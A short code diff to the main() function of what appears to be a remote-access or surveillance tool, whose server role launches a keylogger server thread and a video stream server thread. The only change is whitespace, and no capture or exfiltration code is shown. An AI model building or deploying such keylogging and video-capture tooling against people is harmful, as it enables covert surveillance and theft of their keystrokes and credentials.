@@ -19,7 +19,7 @@ def main():
         server = Server(host=args.host, port=args.port)
         video_thread = threading.Thread(target=start_video_stream_server, args=(args.host, args.video_port))
         keylogger_thread = threading.Thread(target=start_keylogger_server, args=(args.host, args.keylogger_port))
-        video_thread.start()
+        video_thread.start()            
         keylogger_thread.start()
         server.start()
     elif args.role == 'client':
